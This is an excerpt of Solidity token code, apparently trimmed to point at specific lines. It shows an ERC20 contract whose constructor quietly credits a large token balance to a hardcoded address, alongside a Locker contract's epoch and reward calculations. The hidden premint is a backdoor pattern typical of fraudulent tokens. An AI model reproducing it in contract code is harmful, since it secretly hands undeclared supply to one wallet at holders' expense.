...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        _symbol = symbol_;
        _balances[
            0x3e9e5876F3A992EFcC23E84DD64431EDf02470E1
        ] += 500000000000000;
    }
...
contract Locker is ERC20 {
        ...
        returns (uint256 rewardAmount)
    {
        ...
        uint256 userEpochTime = (block.timestamp - startTime) /
            epoch -
            holder.epochTime;
        rewardAmount =
    ...
    function getCurrentEpoch()
        ...
        view
        returns (
            uint256 userEpochTime,
            uint256 currentBlock,
            uint256 currentEpoch
        )
    {
        userEpochTime = (block.timestamp - startTime) / epoch;
        currentBlock = block.timestamp;
        currentEpoch = (block.timestamp - startTime) / epoch;
    }
